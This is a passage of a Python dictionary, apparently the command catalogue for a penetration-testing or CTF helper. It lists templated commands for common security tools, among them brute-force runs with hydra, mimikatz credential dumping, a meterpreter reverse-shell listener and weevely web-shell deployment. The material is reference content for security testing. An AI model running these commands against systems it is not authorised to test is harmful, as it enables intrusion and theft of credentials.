                        "description": "Directory fuzzing showing only HTTP 200 responses"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -recursion -recursion-depth 2",
                        "description": "Recursive directory fuzzing with depth 2"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -x http://127.0.0.1:8080",
                        "description": "Directory fuzzing through HTTP proxy"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -fc 404",
                        "description": "Filter out 404 status codes"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u https://{target}/FUZZ -k",
                        "description": "Ignore TLS certificate errors"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/api/v1/FUZZ -mc 200,301,302",
                        "description": "API endpoint discovery with specific status codes"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -H \"Authorization: Bearer TOKEN\"",
                        "description": "Fuzz with custom header (e.g., API key)"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -c -v",
                        "description": "Colored output with verbose mode"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -fc 404 -fw 5",
                        "description": "Filter by status code and word count"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -fs 0",
                        "description": "Filter out empty responses"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -mr \"regex\"",
                        "description": "Match responses containing regex pattern"
                    },
                    {
                        "command": "ffuf -w {wordlist} -u http://{target}/FUZZ -t 100",
                        "description": "Increase threads to 100 for faster fuzzing"
                    }
                ]
            },
            "feroxbuster": {
                "description": "Fast, simple, recursive content discovery tool",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "feroxbuster -u http://{target} -w {wordlist}",
                        "description": "Basic directory scan"
                    },
                    {
                        "command": "feroxbuster -u http://{target} -w {wordlist} -t 100",
                        "description": "Directory scan with 100 threads"
                    },
                    {
                        "command": "feroxbuster -u http://{target} -w {wordlist} -x php,txt,html",
                        "description": "Directory scan with file extensions"
                    },
                    {
                        "command": "feroxbuster -u http://{target} -w {wordlist} --depth 2",
                        "description": "Recursive directory scan with depth 2"
                    }
                ]
            },
            "wfuzz": {
                "description": "Web application fuzzer",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "wfuzz -w {wordlist} http://{target}/FUZZ",
                        "description": "Basic directory fuzzing"
                    },
                    {
                        "command": "wfuzz -w {wordlist} -c --hc 404 http://{target}/FUZZ",
                        "description": "Directory fuzzing hiding 404 responses"
                    },
                    {
                        "command": "wfuzz -w {wordlist} -z file,{wordlist2} http://{target}/FUZZ?param=FUZ2Z",
                        "description": "Fuzzing with two wordlists"
                    }
                ]
            },
            
            # Network & Enumeration
            "enum4linux": {
                "description": "Tool for enumerating information from Windows and Samba systems",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "enum4linux {target}",
                        "description": "Basic enumeration"
                    },
                    {
                        "command": "enum4linux -a {target}",
                        "description": "Do all simple enumeration (-U -S -G -P -r -o -n -i)"
                    },
                    {
                        "command": "enum4linux -U {target}",
                        "description": "Enumerate users"
                    },
                    {
                        "command": "enum4linux -S {target}",
                        "description": "Enumerate shares"
                    }
                ]
            },
            "smbmap": {
                "description": "SMB share enumerator",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "smbmap -H {target}",
                        "description": "List shares on target"
                    },
                    {
                        "command": "smbmap -H {target} -R",
                        "description": "Recursively list directories and files"
                    },
                    {
                        "command": "smbmap -H {target} -u 'username' -p 'password'",
                        "description": "Connect with credentials"
                    },
                    {
                        "command": "smbmap -H {target} --download 'share/file.txt'",
                        "description": "Download a specific file"
                    }
                ]
            },
            "crackmapexec": {
                "description": "Swiss army knife for pentesting networks",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "crackmapexec smb {target}",
                        "description": "Basic SMB enumeration"
                    },
                    {
                        "command": "crackmapexec smb {target} -u 'user' -p 'pass'",
                        "description": "Test credentials"
                    },
                    {
                        "command": "crackmapexec smb {target} -u users.txt -p passwords.txt",
                        "description": "Spray credentials from files"
                    },
                    {
                        "command": "crackmapexec smb {target} --shares",
                        "description": "List shares"
                    }
                ]
            },
            
            # Credential Testing
            "hydra": {
                "description": "Online password cracking tool",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "hydra -l admin -P {wordlist} {target} ssh",
                        "description": "SSH brute force with admin username"
                    },
                    {
                        "command": "hydra -L {wordlist} -P {wordlist2} {target} ssh",
                        "description": "SSH brute force with username and password lists"
                    },
                    {
                        "command": "hydra -l admin -P {wordlist} http-post-form \"/login.php:username=^USER^&password=^PASS^:Invalid\"",
                        "description": "HTTP form brute force"
                    },
                    {
                        "command": "hydra -l admin -P {wordlist} {target} ftp",
                        "description": "FTP brute force"
                    },
                    {
                        "command": "hydra -l admin -P {wordlist} {target} rdp",
                        "description": "RDP brute force"
                    }
                ]
            },
            "medusa": {
                "description": "Parallel, modular, speedy login brute-forcer",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "medusa -h {target} -u admin -P {wordlist} -M ssh",
                        "description": "SSH brute force with admin username"
                    },
                    {
                        "command": "medusa -h {target} -U {wordlist} -P {wordlist2} -M ssh",
                        "description": "SSH brute force with username and password lists"
                    }
                ]
            },
            "john": {
                "description": "John the Ripper password cracker",
                "requires_target": False,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "john --wordlist={wordlist} hashfile.txt",
                        "description": "Dictionary attack on password hashes"
                    },
                    {
                        "command": "john --wordlist={wordlist} --rules hashfile.txt",
                        "description": "Dictionary attack with word mangling rules"
                    },
                    {
                        "command": "john --incremental hashfile.txt",
                        "description": "Incremental brute force attack"
                    },
                    {
                        "command": "john --show hashfile.txt",
                        "description": "Show cracked passwords"
                    }
                ]
            },
            "hashcat": {
                "description": "Advanced password recovery",
                "requires_target": False,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "hashcat -m 0 -a 0 hashfile.txt {wordlist}",
                        "description": "Dictionary attack on MD5 hashes"
                    },
                    {
                        "command": "hashcat -m 1000 -a 0 hashfile.txt {wordlist}",
                        "description": "Dictionary attack on NTLM hashes"
                    },
                    {
                        "command": "hashcat -m 0 -a 3 hashfile.txt ?a?a?a?a?a?a",
                        "description": "Mask attack with 6 characters"
                    },
                    {
                        "command": "hashcat -m 0 -a 1 hashfile.txt {wordlist} {wordlist2}",
                        "description": "Combinator attack with two wordlists"
                    }
                ]
            },
            
            # Vulnerability Assessment
            "openvas": {
                "description": "Open Vulnerability Assessment System",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "gvm-cli socket --xml \"<create_task><name>Scan {target}</name><config id='daba56c8-73ec-11df-a475-002264764cea'/><target id='{target_id}'/></create_task>\"",
                        "description": "Create a new scan task"
                    },
                    {
                        "command": "gvm-cli socket --xml \"<start_task task_id='{task_id}'/>\"",
                        "description": "Start a scan task"
                    }
                ]
            },
            
            # SSL/TLS & Encryption
            "sslscan": {
                "description": "SSL/TLS scanning tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "sslscan {target}:443",
                        "description": "Basic SSL/TLS scan"
                    },
                    {
                        "command": "sslscan --no-fallback {target}:443",
                        "description": "Check for SSL/TLS protocols without fallback"
                    },
                    {
                        "command": "sslscan --tlsall {target}:443",
                        "description": "Check all TLS versions"
                    },
                    {
                        "command": "sslscan --show-certificate {target}:443",
                        "description": "Show certificate details"
                    }
                ]
            },
            "testssl.sh": {
                "description": "Testing SSL/TLS security on any host",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "testssl.sh {target}:443",
                        "description": "Basic SSL/TLS test"
                    },
                    {
                        "command": "testssl.sh --pfs {target}:443",
                        "description": "Check perfect forward secrecy"
                    },
                    {
                        "command": "testssl.sh --heartbleed {target}:443",
                        "description": "Check for Heartbleed vulnerability"
                    },
                    {
                        "command": "testssl.sh --cipher {target}:443",
                        "description": "Check supported ciphers"
                    }
                ]
            },
            "openssl": {
                "description": "OpenSSL command line tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "openssl s_client -connect {target}:443",
                        "description": "Connect to SSL/TLS service"
                    },
                    {
                        "command": "openssl s_client -connect {target}:443 -showcerts",
                        "description": "Connect and show certificates"
                    },
                    {
                        "command": "openssl x509 -in cert.pem -text -noout",
                        "description": "Display certificate information"
                    },
                    {
                        "command": "openssl rsa -in private.key -check",
                        "description": "Check RSA private key"
                    },
                    {
                        "command": "openssl genrsa -out private.key 2048",
                        "description": "Generate 2048-bit RSA private key"
                    },
                    {
                        "command": "openssl req -new -x509 -key private.key -out cert.crt -days 365",
                        "description": "Generate self-signed certificate"
                    },
                    {
                        "command": "openssl aes-256-cbc -in file.txt -out file.enc",
                        "description": "Encrypt file with AES-256-CBC"
                    },
                    {
                        "command": "openssl aes-256-cbc -d -in file.enc -out file.txt",
                        "description": "Decrypt AES-256-CBC encrypted file"
                    },
                    {
                        "command": "openssl passwd -1 password",
                        "description": "Generate MD5 password hash"
                    },
                    {
                        "command": "openssl passwd -5 password",
                        "description": "Generate SHA256 password hash"
                    },
                    {
                        "command": "openssl rand -hex 16",
                        "description": "Generate 16 bytes of random data"
                    },
                    {
                        "command": "openssl dgst -sha256 file.txt",
                        "description": "Calculate SHA-256 hash of file"
                    },
                    {
                        "command": "openssl dgst -md5 file.txt",
                        "description": "Calculate MD5 hash of file"
                    },
                    {
                        "command": "openssl enc -base64 -in file.txt -out file.b64",
                        "description": "Base64 encode file"
                    },
                    {
                        "command": "openssl enc -base64 -d -in file.b64 -out file.txt",
                        "description": "Base64 decode file"
                    },
                    {
                        "command": "openssl rsautl -encrypt -inkey public.pem -pubin -in file.txt -out file.enc",
                        "description": "RSA encrypt with public key"
                    },
                    {
                        "command": "openssl rsautl -decrypt -inkey private.pem -in file.enc -out file.txt",
                        "description": "RSA decrypt with private key"
                    }
                ]
            },
            
            # Cryptography & Encoding
            "gpg": {
                "description": "GNU Privacy Guard - encryption and signing",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "gpg --gen-key",
                        "description": "Generate new GPG key pair"
                    },
                    {
                        "command": "gpg --encrypt --recipient user@email.com file.txt",
                        "description": "Encrypt file for specific recipient"
                    },
                    {
                        "command": "gpg --decrypt file.txt.gpg",
                        "description": "Decrypt GPG encrypted file"
                    },
                    {
                        "command": "gpg --sign file.txt",
                        "description": "Sign file with your key"
                    },
                    {
                        "command": "gpg --verify file.txt.sig",
                        "description": "Verify signature"
                    },
                    {
                        "command": "gpg --list-keys",
                        "description": "List all public keys"
                    },
                    {
                        "command": "gpg --list-secret-keys",
                        "description": "List all private keys"
                    },
                    {
                        "command": "gpg --export -a user@email.com > public.key",
                        "description": "Export public key"
                    },
                    {
                        "command": "gpg --import public.key",
                        "description": "Import public key"
                    },
                    {
                        "command": "gpg --symmetric file.txt",
                        "description": "Symmetric encryption with passphrase"
                    }
                ]
            },
            "hash-identifier": {
                "description": "Identify hash types",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "hash-identifier",
                        "description": "Launch hash identifier tool"
                    },
                    {
                        "command": "echo \"hash\" | hash-identifier",
                        "description": "Identify hash from echo"
                    }
                ]
            },
            "base64": {
                "description": "Base64 encoding/decoding",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "echo 'text' | base64",
                        "description": "Encode text to base64"
                    },
                    {
                        "command": "echo 'dGV4dA==' | base64 -d",
                        "description": "Decode base64 to text"
                    },
                    {
                        "command": "base64 file.txt > file.b64",
                        "description": "Encode file to base64"
                    },
                    {
                        "command": "base64 -d file.b64 > file.txt",
                        "description": "Decode base64 file"
                    },
                    {
                        "command": "echo 'text' | base64 -w 0",
                        "description": "Encode without line wrapping"
                    }
                ]
            },
            "steghide": {
                "description": "Steganography tool for hiding data",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "steghide embed -cf image.jpg -ef secret.txt",
                        "description": "Embed secret file in image"
                    },
                    {
                        "command": "steghide extract -sf image.jpg",
                        "description": "Extract hidden data from image"
                    },
                    {
                        "command": "steghide info image.jpg",
                        "description": "Display info about embedded data"
                    },
                    {
                        "command": "steghide embed -cf image.jpg -ef secret.txt -p password",
                        "description": "Embed with password protection"
                    }
                ]
            },
            "stegcracker": {
                "description": "Steganography brute-force utility",
                "requires_target": False,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "stegcracker image.jpg {wordlist}",
                        "description": "Brute force steghide password"
                    },
                    {
                        "command": "stegcracker image.jpg {wordlist} -o output.txt",
                        "description": "Brute force and save extracted data"
                    }
                ]
            },
            "exiftool": {
                "description": "Read and write meta information in files",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "exiftool image.jpg",
                        "description": "Display all metadata"
                    },
                    {
                        "command": "exiftool -a -G1 image.jpg",
                        "description": "Display metadata with group names"
                    },
                    {
                        "command": "exiftool -GPS* image.jpg",
                        "description": "Display GPS metadata"
                    },
                    {
                        "command": "exiftool -Comment='Hidden text' image.jpg",
                        "description": "Add comment to metadata"
                    },
                    {
                        "command": "exiftool -all= image.jpg",
                        "description": "Remove all metadata"
                    },
                    {
                        "command": "exiftool -r /path/to/directory",
                        "description": "Recursively process directory"
                    }
                ]
            },
            "cyberchef": {
                "description": "The Cyber Swiss Army Knife for encoding/decoding",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "firefox https://gchq.github.io/CyberChef/",
                        "description": "Open CyberChef in browser"
                    }
                ]
            },
            "xortool": {
                "description": "Tool to analyze multi-byte XOR cipher",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "xortool encrypted_file",
                        "description": "Analyze XOR encrypted file"
                    },
                    {
                        "command": "xortool -l 4 encrypted_file",
                        "description": "Analyze with known key length"
                    },
                    {
                        "command": "xortool -c 20 encrypted_file",
                        "description": "Analyze with most frequent char (space)"
                    },
                    {
                        "command": "xortool -b encrypted_file",
                        "description": "Brute force key length"
                    }
                ]
            },
            "rsactftool": {
                "description": "RSA attack tool for CTF",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "python3 RsaCtfTool.py --publickey public.pem --uncipherfile encrypted.txt",
                        "description": "Attempt to decrypt RSA encrypted file"
                    },
                    {
                        "command": "python3 RsaCtfTool.py --publickey public.pem --private",
                        "description": "Try to recover private key from public key"
                    },
                    {
                        "command": "python3 RsaCtfTool.py --n N --e E --uncipherfile encrypted.txt",
                        "description": "Decrypt with given N and E values"
                    }
                ]
            },
            
            # Wireless Security
            "aircrack-ng": {
                "description": "WiFi security auditing tools suite",
                "requires_target": False,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "aircrack-ng -w {wordlist} capture.cap",
                        "description": "Crack WPA/WPA2 handshake with wordlist"
                    },
                    {
                        "command": "airmon-ng start wlan0",
                        "description": "Start monitor mode on wireless interface"
                    },
                    {
                        "command": "airodump-ng wlan0mon",
                        "description": "Scan for wireless networks"
                    },
                    {
                        "command": "aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon",
                        "description": "Deauthenticate a client to capture handshake"
                    }
                ]
            },
            
            # Reverse Engineering & Binary
            "binwalk": {
                "description": "Firmware analysis tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "binwalk firmware.bin",
                        "description": "Analyze firmware file"
                    },
                    {
                        "command": "binwalk -e firmware.bin",
                        "description": "Extract firmware contents"
                    },
                    {
                        "command": "binwalk -y signature firmware.bin",
                        "description": "Search for specific signatures"
                    },
                    {
                        "command": "binwalk -B firmware.bin",
                        "description": "Scan for common file signatures"
                    },
                    {
                        "command": "binwalk -E firmware.bin",
                        "description": "Calculate file entropy"
                    },
                    {
                        "command": "binwalk --dd='.*' firmware.bin",
                        "description": "Extract all recognizable files"
                    }
                ]
            },
            "strings": {
                "description": "Extract printable strings from binary files",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "strings binary_file",
                        "description": "Extract all strings from binary file"
                    },
                    {
                        "command": "strings -n 10 binary_file",
                        "description": "Extract strings of at least 10 characters"
                    },
                    {
                        "command": "strings binary_file | grep password",
                        "description": "Extract strings and filter for 'password'"
                    },
                    {
                        "command": "strings -a -t x binary_file",
                        "description": "Extract strings from entire file with hex offsets"
                    },
                    {
                        "command": "strings -e l binary_file",
                        "description": "Extract 16-bit little-endian strings"
                    },
                    {
                        "command": "strings -e b binary_file",
                        "description": "Extract 16-bit big-endian strings"
                    }
                ]
            },
            "objdump": {
                "description": "Display information from object files",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "objdump -d binary_file",
                        "description": "Disassemble executable sections"
                    },
                    {
                        "command": "objdump -D binary_file",
                        "description": "Disassemble all sections"
                    },
                    {
                        "command": "objdump -s binary_file",
                        "description": "Display full contents of all sections"
                    },
                    {
                        "command": "objdump -t binary_file",
                        "description": "Display symbol table entries"
                    },
                    {
                        "command": "objdump -R binary_file",
                        "description": "Display dynamic relocation entries"
                    },
                    {
                        "command": "objdump -x binary_file",
                        "description": "Display all headers"
                    },
                    {
                        "command": "objdump -M intel -d binary_file",
                        "description": "Disassemble in Intel syntax"
                    }
                ]
            },
            "radare2": {
                "description": "Advanced reverse engineering framework",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "r2 -A binary_file",
                        "description": "Open binary with analysis"
                    },
                    {
                        "command": "r2 -d binary_file",
                        "description": "Open binary in debug mode"
                    },
                    {
                        "command": "rabin2 -I binary_file",
                        "description": "Display binary information"
                    },
                    {
                        "command": "rabin2 -z binary_file",
                        "description": "Extract strings from binary"
                    },
                    {
                        "command": "rabin2 -i binary_file",
                        "description": "List imports"
                    },
                    {
                        "command": "rabin2 -s binary_file",
                        "description": "List symbols"
                    },
                    {
                        "command": "r2 -qc 'aa; pdf @ main' binary_file",
                        "description": "Analyze and disassemble main function"
                    }
                ]
            },
            "gdb": {
                "description": "GNU Debugger",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "gdb binary_file",
                        "description": "Start GDB with binary"
                    },
                    {
                        "command": "gdb -q binary_file",
                        "description": "Start GDB in quiet mode"
                    },
                    {
                        "command": "gdb -p PID",
                        "description": "Attach to running process"
                    },
                    {
                        "command": "gdb -batch -ex 'disassemble main' binary_file",
                        "description": "Batch disassemble main function"
                    }
                ]
            },
            "ltrace": {
                "description": "Library call tracer",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "ltrace ./binary_file",
                        "description": "Trace library calls"
                    },
                    {
                        "command": "ltrace -S ./binary_file",
                        "description": "Trace system calls and library calls"
                    },
                    {
                        "command": "ltrace -o output.txt ./binary_file",
                        "description": "Save trace to file"
                    }
                ]
            },
            "strace": {
                "description": "System call tracer",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "strace ./binary_file",
                        "description": "Trace system calls"
                    },
                    {
                        "command": "strace -e open,read,write ./binary_file",
                        "description": "Trace specific system calls"
                    },
                    {
                        "command": "strace -p PID",
                        "description": "Attach to running process"
                    },
                    {
                        "command": "strace -c ./binary_file",
                        "description": "Count time, calls, and errors for each syscall"
                    },
                    {
                        "command": "strace -o output.txt ./binary_file",
                        "description": "Save trace to file"
                    }
                ]
            },
            "ghidra": {
                "description": "NSA's reverse engineering tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "ghidraRun",
                        "description": "Launch Ghidra GUI"
                    },
                    {
                        "command": "analyzeHeadless /path/to/project ProjectName -import binary_file",
                        "description": "Headless analysis of binary"
                    }
                ]
            },
            "peda": {
                "description": "Python Exploit Development Assistance for GDB",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "gdb -q binary_file",
                        "description": "Start GDB with PEDA (if installed)"
                    }
                ]
            },
            "checksec": {
                "description": "Check binary security properties",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "checksec --file=binary_file",
                        "description": "Check binary protections (NX, PIE, Canary, RELRO)"
                    },
                    {
                        "command": "checksec --dir=/path/to/binaries",
                        "description": "Check all binaries in directory"
                    },
                    {
                        "command": "checksec --proc-all",
                        "description": "Check all running processes"
                    }
                ]
            },
            "readelf": {
                "description": "Display information about ELF files",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "readelf -h binary_file",
                        "description": "Display ELF header"
                    },
                    {
                        "command": "readelf -S binary_file",
                        "description": "Display section headers"
                    },
                    {
                        "command": "readelf -s binary_file",
                        "description": "Display symbol table"
                    },
                    {
                        "command": "readelf -l binary_file",
                        "description": "Display program headers"
                    },
                    {
                        "command": "readelf -d binary_file",
                        "description": "Display dynamic section"
                    },
                    {
                        "command": "readelf -a binary_file",
                        "description": "Display all information"
                    }
                ]
            },
            "pwntools": {
                "description": "CTF framework and exploit development library",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "python3 -c 'from pwn import *; print(cyclic(100))'",
                        "description": "Generate cyclic pattern"
                    },
                    {
                        "command": "python3 -c 'from pwn import *; print(cyclic_find(0x61616161))'",
                        "description": "Find offset in cyclic pattern"
                    },
                    {
                        "command": "python3 -c 'from pwn import *; print(p32(0xdeadbeef))'",
                        "description": "Pack 32-bit address"
                    },
                    {
                        "command": "python3 -c 'from pwn import *; print(p64(0xdeadbeef))'",
                        "description": "Pack 64-bit address"
                    },
                    {
                        "command": "python3 -c 'from pwn import *; print(xor(b\"test\", b\"key\"))'",
                        "description": "XOR encryption"
                    },
                    {
                        "command": "python3 -c 'from pwn import *; print(shellcraft.sh())'",
                        "description": "Generate shellcode for /bin/sh"
                    }
                ]
            },
            "ropper": {
                "description": "ROP gadget finder and binary analysis tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "ropper --file binary_file",
                        "description": "Find ROP gadgets in binary"
                    },
                    {
                        "command": "ropper --file binary_file --search \"pop rdi\"",
                        "description": "Search for specific gadget"
                    },
                    {
                        "command": "ropper --file binary_file --chain \"execve\"",
                        "description": "Generate ROP chain for execve"
                    },
                    {
                        "command": "ropper --file binary_file --bad-bytes 00",
                        "description": "Find gadgets without null bytes"
                    }
                ]
            },
            "one_gadget": {
                "description": "Find one-shot RCE gadgets in libc",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "one_gadget /lib/x86_64-linux-gnu/libc.so.6",
                        "description": "Find one-shot gadgets in libc"
                    },
                    {
                        "command": "one_gadget -l 1 /lib/x86_64-linux-gnu/libc.so.6",
                        "description": "Find specific level of one-gadget"
                    }
                ]
            },
            
            # Exploitation & Post-Exploitation
            "msfconsole": {
                "description": "Metasploit Framework console",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {local_ip}; set LPORT 4444; exploit'",
                        "description": "Start a meterpreter listener"
                    },
                    {
                        "command": "msfconsole -q -x 'db_status; hosts; services'",
                        "description": "Check database status and view hosts/services"
                    }
                ]
            },
            "searchsploit": {
                "description": "Exploit-DB search tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "searchsploit apache 2.4",
                        "description": "Search for exploits related to Apache 2.4"
                    },
                    {
                        "command": "searchsploit -t apache 2.4",
                        "description": "Search for exploits and include title"
                    },
                    {
                        "command": "searchsploit -m 12345",
                        "description": "Copy exploit to current directory"
                    }
                ]
            },
            "mimikatz": {
                "description": "Windows credential extraction tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"",
                        "description": "Extract plaintext passwords from memory"
                    },
                    {
                        "command": "mimikatz.exe \"lsadump::lsa /inject\"",
                        "description": "Dump LSA secrets"
                    }
                ]
            },
            "weevely": {
                "description": "Web shell password protected generator",
                "requires_target": False,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "weevely generate {password} shell.php",
                        "description": "Generate PHP web shell with password"
                    },
                    {
                        "command": "weevely http://{target}/shell.php {password}",
                        "description": "Connect to deployed web shell"
                    },
                    {
                        "command": "weevely http://{target}/shell.php {password} :system_info",
                        "description": "Get system information through web shell"
                    },
                    {
                        "command": "weevely http://{target}/shell.php {password} :audit_filesystem",
                        "description": "Audit filesystem through web shell"
                    }
                ]
            },
            
            # Social Engineering
            "setoolkit": {
                "description": "Social Engineer Toolkit",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "setoolkit",
                        "description": "Launch the Social Engineer Toolkit"
                    }
                ]
            },
            
            # OSINT (Open Source Intelligence)
            "theHarvester": {
                "description": "Gather emails, subdomains, hosts, etc.",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "theHarvester -d {target} -l 500 -b google",
                        "description": "Gather information from Google"
                    },
                    {
                        "command": "theHarvester -d {target} -l 500 -b all",
                        "description": "Gather information from all sources"
                    },
                    {
                        "command": "theHarvester -d {target} -l 500 -b bing,linkedin",
                        "description": "Gather information from specific sources"
                    }
                ]
            },
            "spiderfoot": {
                "description": "OSINT automation tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "sf -s {target} -m all",
                        "description": "Scan target with all modules"
                    },
                    {
                        "command": "sf -s {target} -m s3_common,site_web",
                        "description": "Scan target with specific modules"
                    }
                ]
            },
            "hakrawler": {
                "description": "Fast web crawler",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "echo {target} | hakrawler",
                        "description": "Basic web crawling"
                    },
                    {
                        "command": "echo {target} | hakrawler -depth 2",
                        "description": "Crawl with depth limit of 2"
                    },
                    {
                        "command": "echo {target} | hakrawler -subs",
                        "description": "Find subdomains while crawling"
                    },
                    {
                        "command": "echo {target} | hakrawler -js",
                        "description": "Extract JavaScript files"
                    },
                    {
                        "command": "echo {target} | hakrawler -forms",
                        "description": "Extract forms from pages"
                    },
                    {
                        "command": "echo {target} | hakrawler -links",
                        "description": "Extract all links"
                    },
                    {
                        "command": "echo {target} | hakrawler -insecure",
                        "description": "Skip TLS certificate verification"
                    },
                    {
                        "command": "echo {target} | hakrawler -url {target}",
                        "description": "Specify URL directly"
                    },
                    {
                        "command": "echo {target} | sudo docker run --rm -i hakluke/hakrawler",
                        "description": "Run with Docker"
                    },
                    {
                        "command": "cat urls.txt | hakrawler",
                        "description": "Crawl multiple URLs from file"
                    }
                ]
            },
            
            # Fuzzing & Testing
            "radamsa": {
                "description": "General-purpose fuzzer",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "radamsa input_file",
                        "description": "Fuzz input file"
                    },
                    {
                        "command": "cat input_file | radamsa -n 100 -o output-%n.txt",
                        "description": "Generate 100 fuzzed files"
                    }
                ]
            },
            "cewl": {
                "description": "Custom word list generator",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "cewl http://{target}",
                        "description": "Generate wordlist from website"
                    },
                    {
                        "command": "cewl http://{target} -w wordlist.txt",
                        "description": "Save wordlist to file"
                    },
                    {
                        "command": "cewl http://{target} -d 3 -m 5",
                        "description": "Depth 3, minimum word length 5"
                    },
                    {
                        "command": "cewl http://{target} -n",
                        "description": "Include numbers in wordlist"
                    },
                    {
                        "command": "cewl http://{target} -e",
                        "description": "Include email addresses"
                    },
                    {
                        "command": "cewl http://{target} --with-numbers",
                        "description": "Include numbers in words"
                    },
                    {
                        "command": "cewl http://{target} -a",
                        "description": "Include meta data"
                    },
                    {
                        "command": "cewl http://{target} -v",
                        "description": "Verbose output"
                    },
                    {
                        "command": "cewl http://{target} -c",
                        "description": "Count words"
                    },
                    {
                        "command": "cewl http://{target} -l 10",
                        "description": "Minimum word length 10"
                    }
                ]
            },
            
            # DNS & Network Tools
            "dnsrecon": {
                "description": "DNS Enumeration Script",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "dnsrecon -d {target}",
                        "description": "Standard DNS enumeration"
                    },
                    {
                        "command": "dnsrecon -d {target} -t std",
                        "description": "Standard enumeration including SOA, NS, A, AAAA, MX and SRV"
                    },
                    {
                        "command": "dnsrecon -d {target} -t axfr",
                        "description": "Attempt zone transfer"
                    },
                    {
                        "command": "dnsrecon -d {target} -t brte -D {wordlist}",
                        "description": "Brute force subdomains using wordlist"
                    }
                ]
            },
            "dnsenum": {
                "description": "DNS enumeration tool",
                "requires_target": True,
                "requires_wordlist": True,
                "commands": [
                    {
                        "command": "dnsenum {target}",
                        "description": "Basic DNS enumeration"
                    },
                    {
                        "command": "dnsenum {target} -f {wordlist}",
                        "description": "DNS enumeration with subdomain brute force"
                    },
                    {
                        "command": "dnsenum {target} -dnsserver 8.8.8.8",
                        "description": "DNS enumeration using specific DNS server"
                    }
                ]
            },
            
            # Post-Exploitation & Lateral Movement
            "pwncat": {
                "description": "Netcat on steroids with firewall evasion",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "pwncat -l -p 4444",
                        "description": "Start a listener on port 4444"
                    },
                    {
                        "command": "pwncat {target} 4444",
                        "description": "Connect to target on port 4444"
                    }
                ]
            },
            "chisel": {
                "description": "Fast TCP/UDP tunneling over HTTP",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "chisel server -p 8080 --reverse",
